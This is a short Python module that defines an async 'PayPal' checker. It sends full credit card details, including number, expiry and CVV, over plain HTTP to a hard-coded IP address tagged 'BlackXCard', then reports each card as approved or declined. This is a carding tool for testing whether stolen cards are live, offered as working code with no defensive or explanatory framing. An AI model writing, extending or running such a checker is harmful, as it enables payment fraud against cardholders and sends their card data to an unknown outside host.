import aiohttp
import asyncio
import json
import time


PP_API_URL = "http://103.131.128.254:8084/check?gateway=PayPal&key=BlackXCard&cc="


async def paypal_api_check(cc, mm, yy, cvv):
    card = f"{cc}|{mm}|{yy}|{cvv}"
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=35)) as session:
            async with session.get(PP_API_URL + card) as response:
                text = await response.text()

                try:
                    data = json.loads(text)
                    status = data.get("status", "").upper()
                    response_msg = data.get("response", "No response")

                    if status == "APPROVED" or "approved" in response_msg.lower():
                        return f"Approved - {response_msg[:80]}"
                    else:
                        return f"Declined - {response_msg[:80]}"
                except json.JSONDecodeError:
                    return f"Error - Invalid API response"

    except asyncio.TimeoutError:
        return "Error - Timeout"
    except Exception as e:
        return f"Error - {str(e)[:100]}"
